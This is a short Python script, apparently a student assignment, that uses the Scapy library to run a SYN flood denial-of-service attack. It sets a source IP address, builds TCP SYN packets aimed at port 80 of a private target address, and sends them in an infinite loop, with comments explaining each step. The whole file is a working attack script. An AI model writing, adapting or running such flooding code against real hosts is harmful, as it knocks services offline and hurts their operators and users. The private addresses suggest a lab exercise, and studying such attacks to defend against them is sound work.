# -*- coding: utf-8 -*-
"""
Created on Sun Oct 10 20:08:49 2021

@author: ghida
"""

#importing the scapy library (open-source packet manipulating library).

from scapy.all import *
#ghida's part
Src_ip = "10.169.14.245"   #IPV4 address of our source 
Dest_ip ="10.169.10.224" #IPV4 address of our destination
dest_port = 80 #we chose the http port as our target port
src_port=1234 ##We use the source port as 1234 as it uses the datagram protocol where datagram messages
    # are being sent from one computer to another computer that has an application running on it.
    
#jad's part:
#defining a function that take the source and destination ports and sends the TCP Syn packets to the destination IP address.
def SYNFloodAttack(target_ip, source_port, destination_port):
    #The packet variable consists of the IP and the TCP methods the Synchronous requests.
    # to create a packet, we will stack the ip layer which defines the source  and the destination
    #over the TCP protocol using the divide operator
    #The flag "S" defines that the SYN should be on.
    packet_ip=IP(src= Src_ip , dst= Dest_ip)
    packet_syn=TCP(sport =source_port, dport=destination_port, seq= 1505066, flags="S")
    thepacket = packet_ip/packet_syn
    #the send function Sends packets at Layer 3(Scapy creates Layer 2 header), Does not recieve any packets.It is a method from the Scapy Library.
    send(thepacket)
#ghida's part
#We call the synFloodAttack()function 
#in an Infinite while loop
#to continousely send fast SYNs to the destination
while True:
    SYNFloodAttack(Dest_ip, src_port , dest_port  )
    #we run the program so the packets can be sent, and we stopped it by typing ctrl c on the
    #IPython console.
